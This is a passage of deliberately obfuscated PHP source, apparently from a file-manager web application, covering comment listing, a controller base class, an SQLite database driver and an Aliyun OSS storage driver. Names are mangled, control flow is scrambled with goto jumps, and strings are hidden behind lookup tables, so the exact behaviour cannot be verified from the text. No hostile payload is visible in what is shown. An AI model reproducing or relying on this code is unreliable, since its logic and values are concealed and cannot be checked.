"\x52\111\x47\110\124\40\x4a\117\111\x4e\x20{$this->tablePrefix}\143\157\x6d\x6d\145\x6e\x74\137\160\162\x61\x69\163\145\x20\x73\x74\141\x72\40\157\156\40\x63\x6f\155\155\145\156\x74\x2e\143\x6f\155\155\145\156\x74\x49\x44\40\x3d\x20\163\164\141\x72\x2e\143\x6f\x6d\x6d\145\x6e\x74\111\x44"; $DŒç¸–’Óô = $this->alias($cŞÏçÜßˆ[350])->where($C½¸»ñ¤âÊ)->join($a©ëÉŸ¼œ, $cŞÏçÜßˆ[2135])->count(); $c¨ìêãƒñ = array($cŞÏçÜßˆ[2136] => $DÉ×ñìòÌø, $cŞÏçÜßˆ[2137] => $DŒç¸–’Óô); goto d·ˆ´§Îà; d·ˆ´§Îà: return $c¨ìêãƒñ; goto f·ğŸ£; f·ğŸ£: } public function listData($e‡œ¿ì±×¿) { $F†óƒ·‚»µ =& $_SERVER[©]; if (isset($e‡œ¿ì±×¿[$F†óƒ·‚»µ[2138]])) { if ($e‡œ¿ì±×¿[$F†óƒ·‚»µ[2138]]) { $e‡œ¿ì±×¿[$F†óƒ·‚»µ[2139]] = array($F†óƒ·‚»µ[925], intval($e‡œ¿ì±×¿[$F†óƒ·‚»µ[2138]])); } unset($e‡œ¿ì±×¿[$F†óƒ·‚»µ[2138]]); } if (isset($e‡œ¿ì±×¿[$F†óƒ·‚»µ[2140]])) { if ($e‡œ¿ì±×¿[$F†óƒ·‚»µ[2140]]) { $e‡œ¿ì±×¿[$F†óƒ·‚»µ[2139]] = array($F†óƒ·‚»µ[922], intval($e‡œ¿ì±×¿[$F†óƒ·‚»µ[2140]])); } unset($e‡œ¿ì±×¿[$F†óƒ·‚»µ[2140]]); } return $this->_listData($e‡œ¿ì±×¿); } private function _listData($B¡Öæ‹º‰ƒ) { $f°†‚–å·ª =& $_SERVER[©]; $a¨¶¾Ìõæ‡ = $this->where($B¡Öæ‹º‰ƒ)->_makeOrder()->selectPage(100); $this->_listAppendParent($a¨¶¾Ìõæ‡[$f°†‚–å·ª[363]]); $this->_listAppendUser($a¨¶¾Ìõæ‡[$f°†‚–å·ª[363]]); $this->_listAppendMeta($a¨¶¾Ìõæ‡[$f°†‚–å·ª[363]]); return $a¨¶¾Ìõæ‡; } private function _makeOrder() { $dÎÁíÆ‰âƒ =& $_SERVER[©]; $Aó²Ùâ¬‚¶ = array($dÎÁíÆ‰âƒ[2134], $dÎÁíÆ‰âƒ[2131], $dÎÁíÆ‰âƒ[197]); $dÍš‘…ª‰ = Input::get($dÎÁíÆ‰âƒ[415], $dÎÁíÆ‰âƒ[17], $dÎÁíÆ‰âƒ[397], $Aó²Ùâ¬‚¶); $DˆáÌ½Çš‘ = Input::get($dÎÁíÆ‰âƒ[416], $dÎÁíÆ‰âƒ[17], $dÎÁíÆ‰âƒ[1427], array($dÎÁíÆ‰âƒ[2141], $dÎÁíÆ‰âƒ[413])); $fÇ·…æ† = $dÍš‘…ª‰ . $dÎÁíÆ‰âƒ[60] . $DˆáÌ½Çš‘; return $this->order($fÇ·…æ†); } private function _listAppendParent(&$aæˆ»±àÃ) { goto e­¼Ëğº; e­¼Ëğº: $E¸¬’ÍÏ³ =& $_SERVER[©]; $fÎÄ…¯†ÊŞ = array_unique(array_to_keyvalue($aæˆ»±àÃ, $E¸¬’ÍÏ³[43], $E¸¬’ÍÏ³[2129])); $fÎÄ…¯†ÊŞ = array_remove_value($fÎÄ…¯†ÊŞ, $E¸¬’ÍÏ³[476]); goto cˆ±—³©¢’; D…œ‚ˆÖ‘Û: foreach ($aæˆ»±àÃ as &$d¹…Õ¨·ğ¤) { if (isset($EÍ“‘õ¨êâ[$d¹…Õ¨·ğ¤[$E¸¬’ÍÏ³[2129]]])) { $d¹…Õ¨·ğ¤[$E¸¬’ÍÏ³[2142]] = $EÍ“‘õ¨êâ[$d¹…Õ¨·ğ¤[$E¸¬’ÍÏ³[2129]]]; } } goto FíÒê³ÌÎî; cˆ±—³©¢’: if (!$fÎÄ…¯†ÊŞ) { return; } $EÍ“‘õ¨êâ = $this->where(array($E¸¬’ÍÏ³[2130] => array($E¸¬’ÍÏ³[17], $fÎÄ…¯†ÊŞ)))->select(); $EÍ“‘õ¨êâ = array_to_keyvalue($EÍ“‘õ¨êâ, $E¸¬’ÍÏ³[2139]); goto D…œ‚ˆÖ‘Û; FíÒê³ÌÎî: } private function _listAppendUser(&$Cãõ¤¨Èê”) { goto E×ï•‚ŠĞ„; aÔ†Â¯Ø”: if (count($BˆÊë”Ş˜Ğ) == 0) { return; } foreach ($Cãõ¤¨Èê” as $bæ¢¦¥¡‘­) { if (isset($bæ¢¦¥¡‘­[$D÷—”«–õ¬[2142]])) { $BˆÊë”Ş˜Ğ[] = $bæ¢¦¥¡‘­[$D÷—”«–õ¬[2142]][$D÷—”«–õ¬[1434]]; } } $BÉ–É§ï†õ = Model($D÷—”«–õ¬[485])->userListInfo($BˆÊë”Ş˜Ğ); goto E– ğÀˆÏ›; E– ğÀˆÏ›: foreach ($Cãõ¤¨Èê” as &$bæ¢¦¥¡‘­) { $bæ¢¦¥¡‘­[$D÷—”«–õ¬[543]] = $BÉ–É§ï†õ[$bæ¢¦¥¡‘­[$D÷—”«–õ¬[1434]]]; if (isset($bæ¢¦¥¡‘­[$D÷—”«–õ¬[2142]])) { $bæ¢¦¥¡‘­[$D÷—”«–õ¬[2142]][$D÷—”«–õ¬[543]] = $BÉ–É§ï†õ[$bæ¢¦¥¡‘­[$D÷—”«–õ¬[2142]][$D÷—”«–õ¬[1434]]]; } } goto BõÀ«±ŒĞÌ; E×ï•‚ŠĞ„: $D÷—”«–õ¬ =& $_SERVER[©]; $BˆÊë”Ş˜Ğ = array_unique(array_to_keyvalue($Cãõ¤¨Èê”, $D÷—”«–õ¬[43], $D÷—”«–õ¬[1434])); $BˆÊë”Ş˜Ğ = array_remove_value($BˆÊë”Ş˜Ğ, $D÷—”«–õ¬[476]); goto aÔ†Â¯Ø”; BõÀ«±ŒĞÌ: } private function _listAppendMeta(&$f¨–—¤å£) { goto Cè»å„ìêÈ; FİÔÅ÷×ç: if (!$a á¼¬¹¦ê) { return; } foreach ($f¨–—¤å£ as $BÆğ¾»–Å) { if (isset($BÆğ¾»–Å[$AæÚŠ·¤¾Ü[2142]])) { $a á¼¬¹¦ê[] = $BÆğ¾»–Å[$AæÚŠ·¤¾Ü[2142]][$AæÚŠ·¤¾Ü[2139]]; } } $f˜ÛÕŒ¼ì¯ = $this->metaList($a á¼¬¹¦ê); goto E†µé’æÈ; E†µé’æÈ: if (!$f˜ÛÕŒ¼ì¯) { return !1; } foreach ($f¨–—¤å£ as &$BÆğ¾»–Å) { $BÆğ¾»–Å[$AæÚŠ·¤¾Ü[425]] = $f˜ÛÕŒ¼ì¯[$BÆğ¾»–Å[$AæÚŠ·¤¾Ü[2139]]]; if (isset($BÆğ¾»–Å[$AæÚŠ·¤¾Ü[2142]])) { $BÆğ¾»–Å[$AæÚŠ·¤¾Ü[2142]][$AæÚŠ·¤¾Ü[425]] = $f˜ÛÕŒ¼ì¯[$BÆğ¾»–Å[$AæÚŠ·¤¾Ü[2142]][$AæÚŠ·¤¾Ü[2139]]]; } } goto aà¨„¨ÔÈÊ; Cè»å„ìêÈ: $AæÚŠ·¤¾Ü =& $_SERVER[©]; $a á¼¬¹¦ê = array_unique(array_to_keyvalue($f¨–—¤å£, $AæÚŠ·¤¾Ü[43], $AæÚŠ·¤¾Ü[2139])); $a á¼¬¹¦ê = array_remove_value($a á¼¬¹¦ê, $AæÚŠ·¤¾Ü[476]); goto FİÔÅ÷×ç; aà¨„¨ÔÈÊ: } private function metaList($e¨Çì¥ª‡Ú) { goto FÔ†Œ„Ğ–; bßÇ¯½˜ô±: return $C×ç–Óµ¸ƒ ? $C×ç–Óµ¸ƒ : array(); goto eÄˆÚÃ×”; CŠ÷£Š×: $C×ç–Óµ¸ƒ = Model($E•è¬ÎêÓÖ[2143])->where($C¿ÕÖëó´¥)->select(); $C×ç–Óµ¸ƒ = array_to_keyvalue_group($C×ç–Óµ¸ƒ, $E•è¬ÎêÓÖ[2139]); foreach ($C×ç–Óµ¸ƒ as $a­†Æà‚ => $B¥¿Ëãƒñ) { $C©òÆ®³ÀÀ = array(); foreach ($B¥¿Ëãƒñ as $FØÏ•ÚÂÔ¥) { $C©òÆ®³ÀÀ[$FØÏ•ÚÂÔ¥[$E•è¬ÎêÓÖ[99]]] = $FØÏ•ÚÂÔ¥[$E•è¬ÎêÓÖ[368]]; } $C×ç–Óµ¸ƒ[$a­†Æà‚] = $C©òÆ®³ÀÀ; } goto bßÇ¯½˜ô±; FÔ†Œ„Ğ–: $E•è¬ÎêÓÖ =& $_SERVER[©]; if (!$e¨Çì¥ª‡Ú) { return array(); } $C¿ÕÖëó´¥ = array($E•è¬ÎêÓÖ[2139] => array($E•è¬ÎêÓÖ[17], $e¨Çì¥ª‡Ú)); goto CŠ÷£Š×; eÄˆÚÃ×”: } } goto añä‰›¬ğÏ; Cáƒ¡î±ã: class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($fÄäìÕŒ‘¸, $e÷›ÙĞì„´) { $cÉ­ÊñÕÖ =& $_SERVER[©]; if (isset(self::$_methodList[$fÄäìÕŒ‘¸])) { return @call_user_func_array(self::$_methodList[$fÄäìÕŒ‘¸], $e÷›ÙĞì„´); } else { if (method_exists($this, $fÄäìÕŒ‘¸)) { return call_user_func_array(array($this, $fÄäìÕŒ‘¸), $e÷›ÙĞì„´); } else { think_exception(__CLASS__ . $cÉ­ÊñÕÖ[14] . $fÄäìÕŒ‘¸ . $cÉ­ÊñÕÖ[15]); } } } public static function __callStatic($b¤ƒÖÕ±ß, $dËŠÔ‰áæŞ) { if (isset(self::$_methodListStatic[$b¤ƒÖÕ±ß])) { return call_user_func_array(self::$_methodListStatic[$b¤ƒÖÕ±ß], $dËŠÔ‰áæŞ); } else { if (method_exists(self, $b¤ƒÖÕ±ß)) { return call_user_func_array(array(self, $b¤ƒÖÕ±ß), $dËŠÔ‰áæŞ); } else { show_json("{$b¤ƒÖÕ±ß}\50\x29\x20\x6e\x6f\164\40\x65\x78\x69\x73\x74\x3b", !1); } } } public static function addMethod($AñŞÍÆØÅ¾, $E©í›±ïï) { self::$_methodList[$AñŞÍÆØÅ¾] = $E©í›±ïï; } public static function addMethodStatic($BŠö¿¸“³æ, $bÊá‚‰Íİã) { self::$_methodListStatic[$BŠö¿¸“³æ] = $bÊá‚‰Íİã; } } class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto eÊë¿Áè«„; Cé¨­¢´ : $this->tpl = TEMPLATE . MOD . $F åÂãÚ’[18]; $this->_classObjectID = mt_rand(0, 10000); goto eÈœÓ¦Ò”Ğ; b¥ÃöÔ¯¾: $this->in =& $in; $this->values[$F åÂãÚ’[16]] =& $config; $this->values[$F åÂãÚ’[17]] =& $in; goto Cé¨­¢´ ; eÊë¿Áè«„: $F åÂãÚ’ =& $_SERVER[©]; global $in, $config; $this->config =& $config; goto b¥ÃöÔ¯¾; eÈœÓ¦Ò”Ğ: } public function loadClass($cØĞˆæ´‹) { if (1 === func_num_args()) { $this->{$cØĞˆæ´‹} = new $cØĞˆæ´‹(); } else { $bŞÄß·——Ø = new ReflectionClass($cØĞˆæ´‹); $eÅÀÔÛ¶Â = func_get_args(); array_shift($eÅÀÔÛ¶Â); $this->{$cØĞˆæ´‹} = $bŞÄß·——Ø->newInstanceArgs($eÅÀÔÛ¶Â); } return $this->{$cØĞˆæ´‹}; } protected function assign($D÷Ğ‹æé¼Ä, $E¨„Ïó¹Ò¼) { $this->values[$D÷Ğ‹æé¼Ä] = $E¨„Ïó¹Ò¼; } protected function display($eŒ…¯ƒ¥¾‚) { ob_end_clean(); extract($this->values); require $this->tpl . $eŒ…¯ƒ¥¾‚; } } class DbSqliteBase extends Db { public function __construct($F³‹»£•›Ä = '') { $bó‰ŠˆÌÕ =& $_SERVER[©]; if (!extension_loaded($bó‰ŠˆÌÕ[19])) { think_exception(think_lang($bó‰ŠˆÌÕ[20]) . $bó‰ŠˆÌÕ[21]); } if (!empty($F³‹»£•›Ä)) { if (!isset($F³‹»£•›Ä[$bó‰ŠˆÌÕ[22]])) { $F³‹»£•›Ä[$bó‰ŠˆÌÕ[22]] = 438; } $this->config = $F³‹»£•›Ä; if (empty($this->config[$bó‰ŠˆÌÕ[23]])) { $this->config[$bó‰ŠˆÌÕ[23]] = array(); } } } public function connect($Eôôğ†Å„¬ = '', $AÖÈÌ³ß±™ = 0) { $e„ÊÄÑ²ƒœ =& $_SERVER[©]; if (!isset($this->linkID[$AÖÈÌ³ß±™])) { goto a†±„‰í×°; AÃİ¡ÇÖ¨õ: $this->linkID[$AÖÈÌ³ß±™] = $F‘çŠï†í($Eôôğ†Å„¬[$e„ÊÄÑ²ƒœ[27]], $Eôôğ†Å„¬[$e„ÊÄÑ²ƒœ[22]]); if (!$this->linkID[$AÖÈÌ³ß±™]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto cæ¯äÔç·˜; cæ¯äÔç·˜: @sqlite_busy_timeout($this->linkID[$AÖÈÌ³ß±™], 30000); if (1 != think_config($e„ÊÄÑ²ƒœ[28])) { unset($this->config); } goto cªØÑâß‰Û; a†±„‰í×°: if (empty($Eôôğ†Å„¬)) { $Eôôğ†Å„¬ = $this->config; } $DâÖØÜ„Š = !empty($Eôôğ†Å„¬[$e„ÊÄÑ²ƒœ[23]][$e„ÊÄÑ²ƒœ[24]]) ? $Eôôğ†Å„¬[$e„ÊÄÑ²ƒœ[23]][$e„ÊÄÑ²ƒœ[24]] : $this->pconnect; $F‘çŠï†í = $DâÖØÜ„Š ? $e„ÊÄÑ²ƒœ[25] : $e„ÊÄÑ²ƒœ[26]; goto AÃİ¡ÇÖ¨õ; cªØÑâß‰Û: } return $this->linkID[$AÖÈÌ³ß±™]; } public function free() { $this->queryID = null; } public function query($DÓÌĞŠä•ë) { goto b×ŠëÓñ§„; B²˜¦ËëÙ: think_status($dª“£·³Îğ[30]); $this->queryID = sqlite_query($this->_linkID, $DÓÌĞŠä•ë); $this->debug(); goto D•èÛ»á”Ò; d™³Â›‚Ö²: $this->queryStr = $DÓÌĞŠä•ë; if ($this->queryID) { $this->free(); } think_action_status($dª“£·³Îğ[29], 1); goto B²˜¦ËëÙ; b×ŠëÓñ§„: $dª“£·³Îğ =& $_SERVER[©]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto d™³Â›‚Ö²; D•èÛ»á”Ò: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $B”ëÑ´ì§³ = $this->getAll(); return $B”ëÑ´ì§³; } goto e¨Ó¿ä²ï¤; e¨Ó¿ä²ï¤: } public function execute($EÀ„‡Ø—¾) { goto eê¸öºéÈ›; D Ÿó‹– ù: think_status($D×—Öó à[30]); $c£Ì‹šÉ§õ = sqlite_exec($this->_linkID, $EÀ„‡Ø—¾); $this->debug(); goto eËÜŸ¿‰“; eËÜŸ¿‰“: if (!1 === $c£Ì‹šÉ§õ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto E’¦ó¦‰Æ­; eê¸öºéÈ›: $D×—Öó à =& $_SERVER[©]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e£„¼ÌÌƒå; e£„¼ÌÌƒå: $this->queryStr = $EÀ„‡Ø—¾; if ($this->queryID) { $this->free(); } think_action_status($D×—Öó à[31], 1); goto D Ÿó‹– ù; E’¦ó¦‰Æ­: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[©][32]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $c¼¯Ñ‡ÏŒÓ = sqlite_query($this->_linkID, $_SERVER[©][33]); if (!$c¼¯Ñ‡ÏŒÓ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $C§Óµ‚Œéƒ = sqlite_query($this->_linkID, $_SERVER[©][34]); if (!$C§Óµ‚Œéƒ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $cÄ•Ø‡½Í² = array(); if ($this->numRows > 0) { for ($cÀò¯†š = 0; $cÀò¯†š < $this->numRows; $cÀò¯†š++) { $cÄ•Ø‡½Í²[$cÀò¯†š] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $cÄ•Ø‡½Í²; } public function getFields($eˆ„Äø†ÓÚ) { $fĞÍôâ«Àå =& $_SERVER[©]; $A¶àÉù ‹ = $this->query($fĞÍôâ«Àå[35] . $eˆ„Äø†ÓÚ . $fĞÍôâ«Àå[36]); $FáÜ·×¬Á¼ = array(); if ($A¶àÉù ‹) { foreach ($A¶àÉù ‹ as $EÜÕ®–é¸ => $CøÒ•„³Ó‘) { $FáÜ·×¬Á¼[$CøÒ•„³Ó‘[$fĞÍôâ«Àå[37]]] = array($fĞÍôâ«Àå[38] => $CøÒ•„³Ó‘[$fĞÍôâ«Àå[37]], $fĞÍôâ«Àå[39] => $CøÒ•„³Ó‘[$fĞÍôâ«Àå[40]], $fĞÍôâ«Àå[41] => (bool) ($CøÒ•„³Ó‘[$fĞÍôâ«Àå[42]] === $fĞÍôâ«Àå[43]), $fĞÍôâ«Àå[44] => $CøÒ•„³Ó‘[$fĞÍôâ«Àå[45]], $fĞÍôâ«Àå[46] => strtolower($CøÒ•„³Ó‘[$fĞÍôâ«Àå[47]]) == $fĞÍôâ«Àå[48], $fĞÍôâ«Àå[49] => strtolower($CøÒ•„³Ó‘[$fĞÍôâ«Àå[50]]) == $fĞÍôâ«Àå[51]); } } return $FáÜ·×¬Á¼; } public function getTables($Eò²åªøÅ‰ = '') { $bñ”ÚÙ¥åÚ =& $_SERVER[©]; $eŸÔ‡òŸ“ñ = $this->query($bñ”ÚÙ¥åÚ[52] . $bñ”ÚÙ¥åÚ[53] . $bñ”ÚÙ¥åÚ[54]); $fÛÍÙ›‚Û« = array(); foreach ($eŸÔ‡òŸ“ñ as $b‰ ‚Æ“Ó¿ => $aÌ¤·ÙÓÓ‘) { $fÛÍÙ›‚Û«[$b‰ ‚Æ“Ó¿] = current($aÌ¤·ÙÓÓ‘); } return $fÛÍÙ›‚Û«; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $FéìêŠ†òÆ =& $_SERVER[©]; $cÖ„®„ò‰ = sqlite_last_error($this->_linkID); $this->error = $cÖ„®„ò‰ . $FéìêŠ†òÆ[14] . sqlite_error_string($cÖ„®„ò‰); if ($FéìêŠ†òÆ[43] != $this->queryStr) { $this->error .= LNG($FéìêŠ†òÆ[55]) . $this->queryStr; } think_trace($this->error, $FéìêŠ†òÆ[43], $FéìêŠ†òÆ[56]); return $this->error; } public function escapeString($f˜êªÓÏ«¯) { return sqlite_escape_string($f˜êªÓÏ«¯); } public function parseLimit($f§çóœƒî¨) { $f®ëœ‡Îç¼ =& $_SERVER[©]; $E÷»„¾Œ = $f®ëœ‡Îç¼[43]; if (!empty($f§çóœƒî¨)) { $f§çóœƒî¨ = explode($f®ëœ‡Îç¼[57], $f§çóœƒî¨); if (count($f§çóœƒî¨) > 1) { $E÷»„¾Œ .= $f®ëœ‡Îç¼[58] . $f§çóœƒî¨[1] . $f®ëœ‡Îç¼[59] . $f§çóœƒî¨[0] . $f®ëœ‡Îç¼[60]; } else { $E÷»„¾Œ .= $f®ëœ‡Îç¼[58] . $f§çóœƒî¨[0] . $f®ëœ‡Îç¼[60]; } } return $E÷»„¾Œ; } } goto fø“•“»†Ä; fïƒ¦ºè¬Ò: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($Fîï¹¦â») { parent::__construct(); include_once SDK_DIR . $_SERVER[©][1168]; $this->_init($Fîï¹¦â»); } public function _init($A¿¸“ŸŞ) { foreach ($A¿¸“ŸŞ as $EÜ›å„„¤É => $Cõ“§É‰Û) { if (isset($this->{$EÜ›å„„¤É})) { $this->{$EÜ›å„„¤É} = $Cõ“§É‰Û; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[©][1169], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto f Ì±›ÁÓØ; dÒ†ì—ç²: $E›Óİ¿¯ËŞ->setMaxAgeSeconds(600); $E›Óİ¿¯ËŞ->addExposeHeader($bÓ¹ÊÕ™¦Œ[1175]); $E›Óİ¿¯ËŞ->addAllowedHeader($bÓ¹ÊÕ™¦Œ[1170]); goto AˆÂ¯¹ËˆÀ; Eæ®–Û÷¶: $E›Óİ¿¯ËŞ->addAllowedOrigin($bÓ¹ÊÕ™¦Œ[1170]); $E›Óİ¿¯ËŞ->addAllowedMethod($bÓ¹ÊÕ™¦Œ[1171]); $E›Óİ¿¯ËŞ->addAllowedMethod($bÓ¹ÊÕ™¦Œ[1172]); goto dŞóÁôë§–; dŞóÁôë§–: $E›Óİ¿¯ËŞ->addAllowedMethod($bÓ¹ÊÕ™¦Œ[1173]); $E›Óİ¿¯ËŞ->addAllowedMethod($bÓ¹ÊÕ™¦Œ[1174]); $E›Óİ¿¯ËŞ->addAllowedMethod($bÓ¹ÊÕ™¦Œ[165]); goto dÒ†ì—ç²; AˆÂ¯¹ËˆÀ: $DÂ‡Å‹“Ø¬->addRule($E›Óİ¿¯ËŞ); try { $this->client->putBucketCors($this->bucket, $DÂ‡Å‹“Ø¬); } catch (OSS\Core\OssException $b²ç‡ˆ£˜) { return !1; } return !0; goto aÉç«™¨›ˆ; f Ì±›ÁÓØ: $bÓ¹ÊÕ™¦Œ =& $_SERVER[©]; $DÂ‡Å‹“Ø¬ = new OSS\Model\CorsConfig(); $E›Óİ¿¯ËŞ = new OSS\Model\CorsRule(); goto Eæ®–Û÷¶; aÉç«™¨›ˆ: } public function getBucketCors() { goto CµµÚ—ÅÁ; eáœÕğˆĞ: if (!$bŞ³Ò„Ÿœ || !($DáÆ†££í = $bŞ³Ò„Ÿœ->getRules())) { return null; } $f•Œ ğ¢§á = $DáÆ†££í[0]->getAllowedOrigins(); $e¸´¤µÃÆ‚ = $DáÆ†££í[0]->getAllowedMethods(); goto Fİ¯øÅö„ù; Fİ¯øÅö„ù: $e¦™¬¾–ò = $DáÆ†££í[0]->getMaxAgeSeconds(); $eß†¿×“ = $DáÆ†££í[0]->getExposeHeaders(); $B„Å–Ôùğ¯ = $DáÆ†££í[0]->getAllowedHeaders(); goto Dœ†–µÀŠ; CµµÚ—ÅÁ: $B–Áíñä•Ñ =& $_SERVER[©]; $bŞ³Ò„Ÿœ = null; try { $bŞ³Ò„Ÿœ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $eºæ¥ÌíÚî) { return null; } goto eáœÕğˆĞ; Dœ†–µÀŠ: return array($B–Áíñä•Ñ[185] => isset($f•Œ ğ¢§á[0]) ? $f•Œ ğ¢§á[0] : $B–Áíñä•Ñ[43], $B–Áíñä•Ñ[189] => $e¸´¤µÃÆ‚, $B–Áíñä•Ñ[1176] => $e¦™¬¾–ò, $B–Áíñä•Ñ[1177] => isset($eß†¿×“[0]) ? $eß†¿×“[0] : $B–Áíñä•Ñ[43], $B–Áíñä•Ñ[187] => isset($B„Å–Ôùğ¯[0]) ? $B„Å–Ôùğ¯[0] : $B–Áíñä•Ñ[43]); goto cÎõì¿àä­; cÎõì¿àä­: } public function isBucketCors() { goto c›…•†×ö; c›…•†×ö: $DÜ¿Û‡¥â• =& $_SERVER[©]; $a³ëŠ³Ë = $this->getBucketCors(); if (!$a³ëŠ³Ë || !is_array($a³ëŠ³Ë)) { return !1; } goto AÔì’‹Ò¾; AÔì’‹Ò¾: if ($a³ëŠ³Ë[$DÜ¿Û‡¥â•[185]] != $DÜ¿Û‡¥â•[186] || $a³ëŠ³Ë[$DÜ¿Û‡¥â•[187]] != $DÜ¿Û‡¥â•[186]) { return !1; } $aÌ©•Ô…ÓÄ = array_map($DÜ¿Û‡¥â•[188], $a³ëŠ³Ë[$DÜ¿Û‡¥â•[189]]); if (!is_array($aÌ©•Ô…ÓÄ)) { $aÌ©•Ô…ÓÄ = array(); } goto eºë˜Ì¶ ó; eºë˜Ì¶ ó: $A‰Ø£å ù = array($DÜ¿Û‡¥â•[190], $DÜ¿Û‡¥â•[191], $DÜ¿Û‡¥â•[192], $DÜ¿Û‡¥â•[193], $DÜ¿Û‡¥â•[194]); $F¢¢ˆì’¸ì = array_diff($A‰Ø£å ù, $aÌ©•Ô…ÓÄ); return empty($F¢¢ˆì’¸ì); goto a‰×ÌòŸÙ; a‰×ÌòŸÙ: } public function mkfile($câ‰ùÅá––, $cªòŞ“·äí = '', $CİÓŠ²‹»ñ = REPEAT_RENAME) { $Cï›âÆÖ§ = $this->setContent($câ‰ùÅá––, $cªòŞ“·äí); if ($Cï›âÆÖ§ !== !1) { return $this->getPathOuter($câ‰ùÅá––); } return !1; } public function mkdir($Bæ‚ˆ–°Î•, $cºËÓ˜ù = REPEAT_SKIP) { if ($this->_isFolder($Bæ‚ˆ–°Î•)) { return $this->getPathOuter($Bæ‚ˆ–°Î•); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Bæ‚ˆ–°Î•)); } catch (OSS\Core\OssException $F¾–›—©ß‚) { return !1; } return $this->getPathOuter($Bæ‚ˆ–°Î•); } private function fileList($B˜—Êáî¶, $FØÂí¬éªÆ = '', $a©Ì¸ã×†â = 0) { goto b‘ï‹ØµÜ´; d½ÉãİÊ¤”: $b‹„¥â‡¬ = $B³¶Ä¹ åó[43]; $cÅÍ¶çêÇÔ = 1000; $a‘›ê‹¤‡ = $b®Ô„ŠÖ– = array(); goto e„À“¿…É„; e„À“¿…É„: while (!0) { $cµˆé†·² = array($B³¶Ä¹ åó[1178] => $FØÂí¬éªÆ, $B³¶Ä¹ åó[196] => $CŠƒÔê‘›Ÿ, $B³¶Ä¹ åó[1179] => $cÅÍ¶çêÇÔ, $B³¶Ä¹ åó[1180] => $b‹„¥â‡¬); try { $EêÛÊ´Óô = $this->client->listObjects($this->bucket, $cµˆé†·²); } catch (OSS\Core\OssException $e¹„‰•ë•) { break; } $b‹„¥â‡¬ = $EêÛÊ´Óô->getNextMarker(); $CĞÛø„–Ì = $EêÛÊ´Óô->getObjectList(); $DŸÅÎ‡Í© = $EêÛÊ´Óô->getPrefixList(); foreach ($CĞÛø„–Ì as $BÅƒá‘—†ƒ) { if ($BÅƒá‘—†ƒ->getKey() == $CŠƒÔê‘›Ÿ) { continue; } $C‚¼™ùÇ–™ = $BÅƒá‘—†ƒ->getKey(); if ($a©Ì¸ã×†â) { $C‚¼™ùÇ–™ = array($B³¶Ä¹ åó[38] => $C‚¼™ùÇ–™, $B³¶Ä¹ åó[87] => $BÅƒá‘—†ƒ->getSize(), $B³¶Ä¹ åó[200] => strtotime($BÅƒá‘—†ƒ->getLastModified())); } $b®Ô„ŠÖ–[] = $C‚¼™ùÇ–™; } foreach ($DŸÅÎ‡Í© as $B«Ññ’ƒÅ) { $a‘›ê‹¤‡[] = $B«Ññ’ƒÅ->getPrefix(); } if ($b‹„¥â‡¬ === $B³¶Ä¹ åó[43]) { break; } } return array($B³¶Ä¹ åó[84] => $a‘›ê‹¤‡, $B³¶Ä¹ åó[83] => $b®Ô„ŠÖ–); goto cŞÛÂˆïæ¿; b‘ï‹ØµÜ´: $B³¶Ä¹ åó =& $_SERVER[©]; $B˜—Êáî¶ = trim($B˜—Êáî¶, $B³¶Ä¹ åó[18]); $CŠƒÔê‘›Ÿ = empty($B˜—Êáî¶) ? $B³¶Ä¹ åó[43] : $B˜—Êáî¶ . $B³¶Ä¹ åó[18]; goto d½ÉãİÊ¤”; cŞÛÂˆïæ¿: } public function copyFile($bÁøœÖÆ¹, $a´ãÛ†ë”¹) { $D‰Œˆ¾åÒ = $this->size($bÁøœÖÆ¹); if ($D‰Œˆ¾åÒ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $bÁøœÖÆ¹, $this->bucket, $this->pathEncode($a´ãÛ†ë”¹)); } catch (OSS\Core\OssException $aè³™Øµõ) { return !1; } return $this->getPathOuter($a´ãÛ†ë”¹); } $cÎéØá–Ï = $this->multiCopyObject($bÁøœÖÆ¹, $a´ãÛ†ë”¹, $D‰Œˆ¾åÒ); return $cÎéØá–Ï ? $this->getPathOuter($a´ãÛ†ë”¹) : !1; } private function multiCopyObject($bì©ºéºÑµ, $C¹ˆëó¼†½, $b×·‘ç®¦ô) { $CƒÀË³ÜÍ® =& $_SERVER[©]; try { goto A‹‡ì¦œÇ™; AÅ‚ñŒàœæ: $d…•â—Ìø‰ = 1024 * 1024 * 10; $cìœƒª¸°ª = $this->client->generateMultiuploadParts($b×·‘ç®¦ô, $d…•â—Ìø‰); foreach ($cìœƒª¸°ª as $Dì‹õéäã¥ => $c†‰çš”ñ) { $e‘ä’Ó¶‹é = $aË¨¶à×Î + (int) $c†‰çš”ñ[$CƒÀË³ÜÍ®[1182]]; $dø½‘®Øèë = (int) $c†‰çš”ñ[$CƒÀË³ÜÍ®[334]] + $e‘ä’Ó¶‹é - 1; $c§¢ëéÂÅé = array($CƒÀË³ÜÍ®[1183] => $e‘ä’Ó¶‹é, $CƒÀË³ÜÍ®[1184] => 